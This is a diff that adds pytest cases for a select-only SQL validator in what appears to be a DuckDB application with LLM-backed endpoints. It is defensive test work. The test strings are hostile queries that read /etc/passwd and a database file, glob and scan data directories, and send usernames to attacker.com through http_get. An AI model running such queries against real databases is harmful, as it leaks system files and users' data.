@@ -77,6 +77,42 @@ def test_validator_rejects_create():
         validate_select_only("CREATE TABLE evil AS SELECT 1")
 
 
+def test_validator_rejects_read_csv():
+    with pytest.raises(ValueError, match="forbidden function"):
+        validate_select_only("SELECT * FROM read_csv('/etc/passwd')")
+
+
+def test_validator_rejects_read_file():
+    with pytest.raises(ValueError, match="forbidden function"):
+        validate_select_only("SELECT read_file('/data/state/system.duckdb') AS leak")
+
+
+def test_validator_rejects_http_get():
+    with pytest.raises(ValueError, match="forbidden function"):
+        validate_select_only("SELECT http_get('https://attacker.com/x?d=' || username) FROM usage_events")
+
+
+def test_validator_rejects_parquet_scan():
+    with pytest.raises(ValueError, match="forbidden function"):
+        validate_select_only("SELECT * FROM parquet_scan('/data/extracts/**')")
+
+
+def test_validator_rejects_glob():
+    with pytest.raises(ValueError, match="forbidden function"):
+        validate_select_only("SELECT * FROM glob('/data/**')")
+
+
+def test_validator_rejects_duckdb_settings():
+    with pytest.raises(ValueError, match="forbidden function"):
+        validate_select_only("SELECT * FROM duckdb_settings()")
+
+
+def test_validator_accepts_column_named_read_count():
+    """Don't false-positive on column names containing forbidden substrings."""
+    sql = "SELECT read_count, file_path FROM usage_session_summary WHERE read_count > 0"
+    assert validate_select_only(sql) == sql.strip()
+
+
 # ---- Endpoint tests with mocked LLM ----
 
 
